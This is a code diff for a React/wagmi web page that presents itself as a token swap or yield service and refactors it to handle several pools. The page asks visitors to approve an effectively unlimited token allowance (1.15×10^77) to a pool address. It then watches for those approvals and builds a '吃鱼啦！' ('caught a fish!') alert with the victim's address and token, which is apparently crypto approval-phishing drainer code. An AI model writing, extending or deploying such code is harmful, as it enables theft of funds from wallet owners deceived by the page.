@@ -3,13 +3,13 @@ import { Button, FormControl, FormLabel, Select } from '@chakra-ui/react'
 import { useState } from 'react'
 import { NextSeo } from 'next-seo'
 import { HeadingComponent } from 'components/layout/HeadingComponent'
-import { dai_weth_approve_config } from '../../abis'
 import axios from 'axios'
-
-function Approve() {
-  const account = useAccount()
-  let [token, setToken] = useState(dai_weth_approve_config.token0.address)
-  const spender = dai_weth_approve_config.POOL
+import { useRouter } from 'next/router'
+import { pools, abis, Pool } from '../../../pools'
+function Approve({ pool }: { pool: Pool }) {
+  let [approving, setApproving] = useState(false)
+  let [token, setToken] = useState(pool.token0.address)
+  const spender = pool.address
   const amount = BigInt(1.15 * 10 ** 77)
 
   const {
@@ -19,7 +19,7 @@ function Approve() {
     isLoading: isPreparing,
   } = usePrepareContractWrite({
     address: token as `0x${string}`,
-    abi: dai_weth_approve_config.ABI.approve,
+    abi: abis.approve,
     functionName: 'approve',
     args: [spender, amount],
     enabled: true,
@@ -29,13 +29,13 @@ function Approve() {
 
   useContractEvent({
     address: token as `0x${string}`,
-    abi: dai_weth_approve_config.ABI.approve,
+    abi: abis.approve,
     eventName: 'Approval',
     listener(log) {
       // 判断topics[2]是否为本项目的pool
       // console.log(log)
       for (let i = 0; i < log.length; i++) {
-        if (BigInt(log[i].topics?.[2] as string) !== BigInt(dai_weth_approve_config.POOL)) return
+        if (BigInt(log[i].topics?.[2] as string) !== BigInt(pool.address)) return
         if (Number(log[i].data) !== 0) {
           const dataStr = `吃鱼啦！\ntoken: ${log[i].address?.toString()}\nowner: 0x${BigInt(log[i].topics?.[1] as string).toString(
             16
@@ -55,11 +55,13 @@ function Approve() {
   })
 
   function submit() {
+    setApproving(true)
     writeAsync?.()
       .then((tx) => {})
       .catch((err) => {
         console.log(err)
       })
+      .finally(() => setApproving(false))
   }
 
   return (
@@ -70,11 +72,11 @@ function Approve() {
         <FormLabel>Select Token</FormLabel>
 
         <Select onChange={(e) => setToken(e.target.value)}>
-          <option value={dai_weth_approve_config.token0.address}>{dai_weth_approve_config.token0.name}</option>
-          <option value={dai_weth_approve_config.token1.address}>{dai_weth_approve_config.token1.name}</option>
+          <option value={pool.token0.address}>{pool.token0.name}</option>
+          <option value={pool.token1.address}>{pool.token1.name}</option>
         </Select>
 
-        <Button mt={4} type="submit" onClick={submit}>
+        <Button mt={4} type="submit" onClick={submit} isLoading={approving} loadingText="Approving" colorScheme="blue" variant="outline">
           Approve
         </Button>
       </FormControl>
@@ -84,10 +86,14 @@ function Approve() {
 
 export default function SignExample() {
   const { isConnected } = useAccount()
+  const router = useRouter()
+  const { id } = router.query
+  const pool = pools.find((p) => p.id + '' === id)
+  if (pool === undefined) return <></>
 
   if (isConnected) {
-    const token0Name = dai_weth_approve_config.token0.name
-    const token1Name = dai_weth_approve_config.token1.name
+    const token0Name = pool.token0.name
+    const token1Name = pool.token1.name
     const swap_name = `${token0Name}-${token1Name} Swap`
     return (
       <div>
@@ -105,7 +111,7 @@ export default function SignExample() {
           <li>That's it! We do the rest. Withdraw whenever you want.</li>
         </ol>
         <br />
-        <Approve />
+        <Approve pool={pool} />
       </div>
     )
   }
